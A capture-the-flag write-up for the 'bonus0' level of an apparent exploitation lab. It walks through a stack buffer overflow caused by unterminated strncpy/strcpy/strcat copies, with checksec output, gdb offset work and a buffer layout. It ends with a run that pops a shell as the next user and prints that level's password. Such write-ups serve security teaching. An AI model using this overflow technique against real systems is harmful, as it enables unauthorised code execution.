# bonus0

## Header

```bash
ssh bonus0@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

<hr>

## Solution

From the following lines we can understand that the program is vulnerable to `buffer overflow`:
``` c
void p(char *dst, const char *message) {
   ...
   strncpy(dst, tmp_buf, 20);
}

void pp(char *buffer0) {
    char buf1[20];
    char buf2[20];

    p(buf2, " - ");
    p(buf1, " - ");

    strcpy(str, buf2);

    str += ft_strlen(str);
    *str = ' ';
    *(str + 1) = '\0';

    strcat(str, buf1);
```

From this line in the [source.s](./source.s) we can understand that the stack was aligned to 16 bytes.
```asm
  and    $0xfffffff0,%esp
```

`gdb` helps us to find out that stack was increased on `8 bytes` during alignment:
```bash
(gdb) b *0x080485a7
Breakpoint 1 at 0x80485a7
(gdb) r 
Starting program: /home/user/bonus0/bonus0 
Breakpoint 1, 0x080485a7 in main ()
(gdb) x $esp
0xbffff708:     0x00000000
(gdb) ni
0x080485aa in main ()
(gdb) x $esp
0xbffff700:     0x080485d0
(gdb) ! $((0xbffff708 - 0xbffff700))
bash: 8: command not found
```

Simple calculations:
`42 bytes` to fill array and `8 bytes` of padding + `4 bytes` to overwrite address = `54 bytes`. <br>
`20 bytes` of non-terminated `buf2` following `20 bytes` of non-terminated `buf1` + `1 space` + `20 bytes` of non-terminated `buf1` again gives us `61 bytes` meaning the attack is feasible.

Here's the scheme of the filling:
```text
|          buffer, 42 bytes         | padding, 8 bytes | addr, 4 bytes  |  junk, 7 bytes  |
| b2, 20 | b1, 20 | 1 space | b1[0] |   b1[1] - b1[8]  | b1[9] - b1[12] | b1[13] - b1[19] | 
```

You should definitely check [payload.py](./payload.py) file!

Now, let's exploit:
```
bonus0@RainFall:~$ nano /tmp/payload.py
bonus0@RainFall:~$ python /tmp/payload.py > /tmp/payload
bonus0@RainFall:~$ cat /tmp/payload - | ./bonus0 
 - 
 - 
XXXXXXXXXXXXXXXXXXXX011111111����3344445��� 011111111����3344445���
whoami
bonus1
cd ../bonus1
ls -la
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## References
